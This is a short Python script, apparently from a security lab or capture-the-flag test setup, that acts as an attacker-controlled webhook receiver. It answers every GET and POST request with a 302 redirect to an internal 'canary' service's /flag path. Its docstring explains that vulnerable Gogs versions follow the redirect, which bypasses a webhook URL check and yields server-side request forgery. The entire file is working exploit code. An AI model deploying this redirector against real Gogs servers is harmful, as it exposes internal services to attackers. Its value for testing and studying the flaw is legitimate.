#!/usr/bin/env python3
"""Attacker-controlled webhook receiver.

Public-facing (host port 33690). Every request is answered with a 302 redirect
to the internal canary service. Gogs' webhook delivery follows this redirect on
vulnerable versions (CVE-2026-47267), turning the payload URL check for
CVE-2022-1285 into a redirect-based SSRF.
"""
from http.server import BaseHTTPRequestHandler, HTTPServer


class H(BaseHTTPRequestHandler):
    def _serve(self):
        self.send_response(302)
        self.send_header("Location", "http://canary:8000/flag")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        self._serve()

    def do_POST(self):
        self._serve()

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 8000), H).serve_forever()
